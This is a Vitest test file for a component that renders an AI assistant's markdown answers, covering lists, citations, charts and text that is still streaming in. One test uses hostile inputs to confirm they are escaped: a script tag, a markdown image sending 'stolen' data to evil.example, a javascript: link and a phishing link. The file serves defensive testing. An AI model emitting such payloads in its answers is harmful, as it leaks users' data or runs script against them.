import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import { Answer } from "@/components/assistant/Answer";
import { formatTick, formatValue, linkSite, niceTicks, outsideCode, parseChart, prepareAnswer } from "@/lib/assistant/format";

const html = (text: string, props: Partial<Parameters<typeof Answer>[0]> = {}) => renderToStaticMarkup(createElement(Answer, { text, ...props }));

describe("how an answer reads", () => {
  it("renders paragraphs, lists, headings and tables as real elements", () => {
    const out = html("## Why\n\nFirst point.\n\n- One\n- Two\n\n1. Step\n2. Next\n\n| A | B |\n|---|---|\n| 1 | 2 |");
    expect(out).toContain("<h3>Why</h3>");
    expect(out).toContain("<p>First point.</p>");
    expect(out).toMatch(/<ul>\s*<li>One<\/li>\s*<li>Two<\/li>\s*<\/ul>/);
    expect(out).toMatch(/<ol>\s*<li>Step<\/li>/);
    expect(out).toMatch(/<div class="assist-md__table"[^>]*>\s*<table>/);
    expect(out).toMatch(/<td>1<\/td>/);
    expect(out).not.toMatch(/\*\*|##|\|---/);
  });

  it("keeps a line break the model typed", () => {
    expect(html("Dear Dean,\nThanks for your time.\nMaria")).toMatch(/Dear Dean,<br\/?>\s*Thanks for your time\.<br\/?>\s*Maria/);
  });

  it("breaks up a wall of sentences, wherever a model ignored its instructions", () => {
    const wall = "One is here. Two is here. Three is here. Four is here. Five is here. Six is here. Seven.";
    expect(html(wall).match(/<p>/g)).toHaveLength(3);
    expect(html(wall)).toContain("<p>One is here. Two is here. Three is here.</p>");
  });

  it("doesn't mistake abbreviations for the end of a sentence", () => {
    const text = "Ask Dr. Cruz first. See Prof. J. Santos on Nov. 20 for it. Use e.g. Scopus. That is all.";
    expect(html(text)).toContain("<p>Ask Dr. Cruz first. See Prof. J. Santos on Nov. 20 for it. Use e.g. Scopus.</p>");
  });

  it("leaves lists and tables unsplit", () => {
    const item = "- One is here. Two is here. Three is here. Four is here. Five is here.";
    expect(html(item).match(/<p>/g)).toBeNull();
  });

  it("escapes HTML, and never loads an image a model names", () => {
    const out = html('Hi <script>alert(1)</script> ![secret](https://evil.example/?q=stolen) [x](javascript:alert(1))');
    expect(out).not.toContain("<script>");
    expect(out).not.toContain("<img");
    expect(out).not.toContain("evil.example");
    expect(out).not.toContain("javascript:");
    expect(out).toContain("secret");
  });

  it("turns <br> into a line break in a table cell", () => {
    expect(html("| A |\n|---|\n| one<br>two |")).toMatch(/one<br\/?>\s*two/);
  });

  it("shows where a link really goes", () => {
    const out = html("[Official guide](https://phish.example/login) and https://www.topuniversities.com/x");
    expect(out).toContain('rel="noopener noreferrer"');
    expect(out).toContain("(phish.example)");
    expect(out).not.toContain("(topuniversities.com)");
    expect(linkSite("/admin/rankings")).toBeNull();
  });

  it("links citations to their sources, and leaves other brackets alone", () => {
    const sources = [{ n: 1, title: "Guide", href: "/guide" }];
    const out = html("It closes in May [1], and arr[2] stays. Also [7].", { sources });
    expect(out).toContain('<a class="assist-cite" href="/guide"');
    expect(out).toContain("arr[2]");
    expect(out).toContain("[7]");
  });

  it("shows a citation as a mark while it's arriving, before its source does", () => {
    expect(html("In May [1].", { streaming: true })).toContain('<span class="assist-cite">1</span>');
  });

  it("leaves citations out of a link's text", () => {
    expect(html("[See [1] there](https://example.org)")).not.toContain("assist-cite");
  });

  it("names a unit's own source as unreviewed", () => {
    expect(html("It says so [1].", { sources: [{ n: 1, title: "Note", href: "/n", from: "College of Science" }] })).toContain("College of Science, not reviewed by the Office");
  });

  it("doesn't cross out rough numbers", () => {
    expect(html("About ~100 to ~200 papers.")).not.toContain("<del>");
  });
});

describe("graphs in an answer", () => {
  const chart = (spec: object) => `Here it is.\n\n\`\`\`chart\n${JSON.stringify(spec)}\n\`\`\``;
  const spec = { type: "bar", title: "Weights", unit: "%", labels: ["Teaching", "Research"], series: [{ name: "Weight", values: [30, 70] }] };

  it("draws one in the Hub's chart frame, with its numbers in the text", () => {
    const out = html(chart(spec));
    expect(out).toContain("assist-chart");
    expect(out).toContain("Weights");
    expect(out).toContain("Teaching");
    expect(out).toContain("70%");
    expect(out).not.toContain("language-chart");
    expect(out).not.toContain('"series"');
  });

  it("waits while the block is still arriving, without showing its JSON", () => {
    const out = html('Here it is.\n\n```chart\n{"type":"bar","labels":["A"', { streaming: true });
    expect(out).toContain("Drawing the graph");
    expect(out).not.toContain("labels");
  });

  it("says so when a finished block can't be drawn", () => {
    expect(html("```chart\n{nope\n```")).toContain("couldn’t be drawn");
    expect(html('```chart\n{"type":"bar","labels":["A"')).toContain("couldn’t be drawn");
  });

  it("keeps ordinary code as code", () => {
    expect(html("```python\nprint(1)\n```")).toMatch(/<pre[^>]*><code class="language-python">print\(1\)/);
  });

  it("reads either shape of data", () => {
    expect(parseChart('{"type":"line","labels":["A","B"],"series":[{"name":"S","values":[1,null]}]}')?.series[0]?.values).toEqual([1, null]);
    const pairs = parseChart('{"type":"bar","data":[{"label":"A","value":"1,200"},{"name":"B","value":"45%"}]}');
    expect(pairs?.labels).toEqual(["A", "B"]);
    expect(pairs?.series[0]?.values).toEqual([1200, 45]);
  });

  it("pads short series, and takes unknown types as bars", () => {
    const out = parseChart('{"type":"radar","labels":["A","B","C"],"series":[{"values":[1,2]}]}');
    expect(out?.type).toBe("bar");
    expect(out?.series[0]?.values).toEqual([1, 2, null]);
  });

  it("refuses what isn't a graph", () => {
    for (const bad of ["nope", "[1,2]", "null", '{"labels":[],"series":[]}', '{"labels":["A"],"series":[{"values":["n/a"]}]}']) expect(parseChart(bad)).toBeNull();
    const huge = { labels: Array.from({ length: 61 }, (_, i) => `L${i}`), series: [{ values: Array.from({ length: 61 }, () => 1) }] };
    expect(parseChart(JSON.stringify(huge))).toBeNull();
  });

  it("draws a pie only for parts of one whole, and otherwise ranked bars", () => {
    expect(parseChart('{"type":"donut","labels":["A","B"],"series":[{"values":[1,3]}]}')?.type).toBe("pie");
    const many = parseChart('{"type":"pie","labels":["A","B","C","D","E","F","G"],"series":[{"values":[1,7,3,4,5,6,2]}]}');
    expect(many?.type).toBe("bar");
    expect(many?.labels.slice(0, 2)).toEqual(["B", "F"]);
    expect(parseChart('{"type":"pie","labels":["A","B"],"series":[{"values":[1,-3]}]}')?.type).toBe("bar");
    expect(parseChart('{"type":"pie","labels":["A"],"series":[{"name":"X","values":[1]},{"name":"Y","values":[2]}]}')?.type).toBe("bar");
  });

  it("puts rank 1 at the top, even when a model forgets to say", () => {
    const line = (extra: object) => parseChart(JSON.stringify({ type: "line", labels: ["A"], series: [{ name: "Score", values: [1] }], ...extra }));
    expect(line({ invert: true })?.invert).toBe(true);
    expect(line({})?.invert).toBe(false);
    expect(line({ series: [{ name: "QS WUR Rank", values: [801] }] })?.invert).toBe(true);
    expect(line({ unit: "Rank" })?.invert).toBe(true);
    expect(line({ unit: "Rank" })?.unit).toBe("");
    expect(line({ series: [{ name: "Ranking score", values: [80] }] })?.invert).toBe(false);
    expect(parseChart('{"type":"bar","labels":["A"],"series":[{"name":"Rank","values":[1]}]}')?.invert).toBe(false);
  });

  it("puts too many series in a table instead of inventing colours", () => {
    const series = Array.from({ length: 7 }, (_, i) => ({ name: `S${i}`, values: [i + 1] }));
    const out = html(chart({ type: "line", title: "Many", labels: ["A"], series }));
    expect(out).toContain("chart-table");
    expect(out).not.toContain("viewtoggle");
  });

  it("formats numbers and axes", () => {
    expect(formatValue(1284)).toBe("1,284");
    expect(formatValue(42.5, "%")).toBe("42.5%");
    expect(formatValue(1200, "$")).toBe("$1,200");
    expect(formatValue(8, "pts")).toBe("8 pts");
    expect(formatTick(20000)).toBe("20K");
    expect(formatTick(50, "%")).toBe("50%");
    expect(formatTick(50, "pts")).toBe("50");
    expect(niceTicks(0, 100)).toEqual([0, 25, 50, 75, 100]);
    expect(niceTicks(0, 7)).toEqual([0, 2, 4, 6, 8]);
    expect(niceTicks(0, 0)).toEqual([0, 0.25, 0.5, 0.75, 1]);
    expect(niceTicks(5, 5).length).toBeGreaterThan(1);
  });
});

describe("half-finished text", () => {
  const live = (text: string) => prepareAnswer(text, true);

  it("closes bold and code so symbols don't flash", () => {
    expect(live("This is **impor")).toBe("This is **impor**");
    expect(live("Use `npm i")).toBe("Use `npm i`");
    expect(live("This is **")).toBe("This is ");
    expect(live("Done **well** now")).toBe("Done **well** now");
  });

  it("holds back a half-written link or citation", () => {
    expect(live("See [the guide](https://exa")).toBe("See the guide");
    expect(live("In May [1")).toBe("In May ");
    expect(live("In May [")).toBe("In May ");
  });

  it("holds a table until its header and divider are both here", () => {
    expect(live("Compare:\n\n| A | B |")).toBe("Compare:\n");
    expect(live("Compare:\n\n| A | B |\n|---|-")).toContain("| A | B |");
    expect(live("Compare:\n\n| A | B |\n| :--- | :")).toBe("Compare:\n");
    expect(live("Compare:\n\n| A | B | C |\n|---|")).toBe("Compare:\n");
    expect(live("| A | B |\n|---|---|\n| 1 |")).toContain("| 1 |");
  });

  it("doesn't let a stray dash turn a sentence into a heading", () => {
    expect(live("A sentence\n-")).toBe("A sentence");
  });

  it("waits for a fence's line to finish", () => {
    expect(live("Look:\n\n``")).toBe("Look:");
    expect(live("Look:\n\n```cha")).toBe("Look:");
    expect(live('```chart\n{"a":1}\n``')).toBe('```chart\n{"a":1}');
  });

  it("touches nothing inside a code block", () => {
    const code = "```js\nconst a = **b; `c";
    expect(live(code)).toBe(code);
  });

  it("leaves a finished answer alone", () => {
    expect(prepareAnswer("This is **impor")).toBe("This is **impor");
  });
});

describe("what models send", () => {
  it("makes real bullets of odd ones", () => {
    expect(prepareAnswer("• One\n  ● Two")).toBe("- One\n  - Two");
    expect(prepareAnswer("Keep · this")).toBe("Keep · this");
  });

  it("keeps a rule from turning the line above into a heading", () => {
    expect(html("A sentence\n---\nThen more")).not.toContain("<h3>");
    expect(html("A sentence\n---\nThen more")).toContain("<hr");
  });

  it("unwraps an answer that came in a markdown fence", () => {
    expect(prepareAnswer("```markdown\n# Hi\n\nThere\n```")).toBe("# Hi\n\nThere");
  });

  it("edits only the prose", () => {
    expect(outsideCode("a `a` a\n```\na\n```\na", (p) => p.replaceAll("a", "b"))).toBe("b `a` b\n```\na\n```\nb");
    expect(outsideCode("x\n```\nunclosed a", (p) => p.replaceAll("x", "y"))).toBe("y\n```\nunclosed a");
    expect(prepareAnswer("```\n• stays\n```")).toBe("```\n• stays\n```");
  });
});
